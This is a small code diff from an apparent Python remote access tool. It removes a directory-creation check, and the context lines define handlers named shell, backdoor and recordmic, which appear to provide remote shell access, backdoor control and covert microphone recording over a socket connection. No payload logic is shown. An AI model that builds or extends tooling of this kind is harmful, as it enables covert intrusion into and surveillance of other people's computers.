@@ -10,9 +10,6 @@ import socket, os, struct
 ip = ""
 port = 0
 
-if not os.path.exists("build"):
-    os.makedirs("build")
-
 def shell(conn, address): shclass.shell(conn, address)
 def backdoor(conn, address): shclass.backdoor(conn, address)
 def recordmic(conn, address): shclass.mic(conn, address)
